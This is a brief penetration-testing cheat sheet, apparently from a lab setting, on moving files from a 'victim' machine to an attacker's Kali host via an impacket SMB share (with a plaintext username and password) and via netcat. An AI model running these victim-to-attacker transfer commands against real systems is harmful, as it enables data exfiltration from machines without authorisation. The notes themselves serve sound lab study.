# Transferring Files



## **SMB**

**Kali**

```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

**Victim**

```
copy C:\File\to\tranfer.exe \\$KALI\public\
```

## Netcat

**Kali(receiving)**

```
nc -l -p 1234 > user.jpg
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < user.jpg
```

